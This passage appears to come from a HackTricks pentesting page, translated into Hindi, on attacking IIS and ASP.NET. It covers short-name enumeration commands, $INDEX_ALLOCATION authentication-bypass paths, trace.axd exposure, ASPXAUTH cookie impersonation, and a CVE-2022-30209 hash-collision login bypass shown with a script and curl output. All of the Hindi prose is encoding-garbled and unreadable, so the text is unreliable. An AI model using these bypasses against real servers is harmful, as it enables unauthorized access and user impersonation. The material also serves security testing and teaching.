рдЖрдк рдЗрд╕ **рддрдХрдиреАрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдЦреЛрдЬреЗ рдЧрдП рдлреЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ **рдлреЛрд▓реНрдбрд░реНрд╕ рдФрд░ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЧрд┐рдирдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЕрдЧрд░ рдпрд╣ Basic Authentication рдорд╛рдВрдЧ рд░рд╣рд╛ рд╣реЛ)ред\
рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдореБрдЦреНрдп рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЕрдЧрд░ рд╕рд░реНрд╡рд░ рдХрдордЬреЛрд░ рд╣реИ рддреЛ **рдпрд╣ рдХреЗрд╡рд▓ рдкреНрд░рддреНрдпреЗрдХ рдлрд╛рдЗрд▓/рдлреЛрд▓реНрдбрд░ рдХреЗ рдирд╛рдо рдХреЗ рдкрд╣рд▓реЗ 6 рдЕрдХреНрд╖рд░ рдФрд░ рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдкрд╣рд▓реЗ 3 рдЕрдХреНрд╖рд░ рддрдХ рд╣реА рдвреВрдБрдв рд╕рдХрддрд╛ рд╣реИ**ред

рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (183).png>)

рдореВрд▓ рдЕрдиреБрд╕рдВрдзрд╛рди: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

рдЖрдк **metasploit** рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `use scanner/http/iis_shortname_scanner`

### Basic Authentication рдмрд╛рдИрдкрд╛рд╕

**IIS 7.5** рдХреЗ рдПрдХ basic authentication рдХреЛ **рдмрд╛рдИрдкрд╛рд╕** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП: `/admin:$i30:$INDEX_ALLOCATION/admin.php` рдпрд╛ `/admin::$INDEX_ALLOCATION/admin.php`

рдЖрдк рдЗрд╕ **рдХрдордЬреЛрд░реА** рдФрд░ рдкрд┐рдЫрд▓реА рдХрдордЬреЛрд░реА рдХреЛ **рдорд┐рд▓рд╛рдХрд░** рдирдП **рдлреЛрд▓реНрдбрд░реНрд╕** рдвреВрдБрдврдиреЗ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ **рдмрд╛рдИрдкрд╛рд╕** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## ASP.NET Trace.AXD рд╕рдХреНрд╖рдо рдбрд┐рдмрдЧрд┐рдВрдЧ

ASP.NET рдореЗрдВ рдПрдХ рдбрд┐рдмрдЧрд┐рдВрдЧ рдореЛрдб рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рдЗрд╕рдХреА рдлрд╛рдЗрд▓ рдХрд╛ рдирд╛рдо `trace.axd` рд╣реИред

рдпрд╣ рдПрдХ рд╕рдордпрд╛рд╡рдзрд┐ рдХреЗ рджреМрд░рд╛рди рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХрд┐рдП рдЧрдП рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдмрд╣реБрдд рд╡рд┐рд╕реНрддреГрдд рд▓реЙрдЧ рд░рдЦрддрд╛ рд╣реИред

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рджреВрд░рд╕реНрде рдХреНрд▓рд╛рдЗрдВрдЯ IP, рд╕рддреНрд░ ID, рд╕рднреА рдЕрдиреБрд░реЛрдз рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреБрдХреАрдЬрд╝, рднреМрддрд┐рдХ рдкрде, рд╕реНрд░реЛрдд рдХреЛрдб рдЬрд╛рдирдХрд╛рд░реА, рдФрд░ рд╕рдВрднрд╡рддрдГ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH рдХреБрдХреА

ASPXAUTH рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **`validationKey`** (string): рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрдХреНрд╕-рдПрдиреНрдХреЛрдбреЗрдб рдХреБрдВрдЬреАред
* **`decryptionMethod`** (string): (рдбрд┐рдлрд╝реЙрд▓реНрдЯ тАЬAESтАЭ).
* **`decryptionIV`** (string): рд╣реЗрдХреНрд╕-рдПрдиреНрдХреЛрдбреЗрдб рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг рд╡реЗрдХреНрдЯрд░ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╢реВрдиреНрдп рдХреЗ рд╡реЗрдХреНрдЯрд░ рдХреЗ рд▓рд┐рдП)ред
* **`decryptionKey`** (string): рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрдХреНрд╕-рдПрдиреНрдХреЛрдбреЗрдб рдХреБрдВрдЬреАред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рд▓реЛрдЧ рдЗрди рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдФрд░ **рдХреБрдХреА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдИрдореЗрд▓** рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк рдПрдХ рд╡реЗрдм рдвреВрдБрдв рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдПрдХ рд╣реА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ ASPXAUTH рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдк **рд╣рдорд▓реЗ рдХреЗ рдЕрдзреАрди рд╕рд░реНрд╡рд░ рдкрд░ рдЖрдк рдЬрд┐рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирдХрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕рдХреЗ рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рджреВрд╕рд░реЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдореЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рд╣рдорд▓рд╛ рдЗрд╕ [**рд░рд╛рдЗрдЯрдЕрдк**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) рдореЗрдВ рдХрд╛рдо рдХрд┐рдпрд╛ рдерд╛ред

## IIS рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдИрдкрд╛рд╕ рдХреИрд╢реНрдб рдкрд╛рд╕рд╡рд░реНрдбреНрд╕ рдХреЗ рд╕рд╛рде (CVE-2022-30209) <a href="#3-iis-authentication-bypass" id="3-iis-authentication-bypass"></a>

рдХреЛрдб рдореЗрдВ рдПрдХ рдмрдЧ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЬрд╛рдБрдЪ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдирд╣реАрдВ рдХрд░рддрд╛ рдерд╛**, рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХрд╛ **рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдХреБрдВрдЬреА рдкрд░ рд╣рд┐рдЯ рд╣реЛрддрд╛ рд╣реИ** рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ **рдХреИрд╢** рдореЗрдВ рд╣реИ, рд╡рд╣ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ ([рдкреВрд░реА рд░рд┐рдкреЛрд░реНрдЯ рдпрд╣рд╛рдБ](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html))ред
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рдореБрдЭреЗ рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
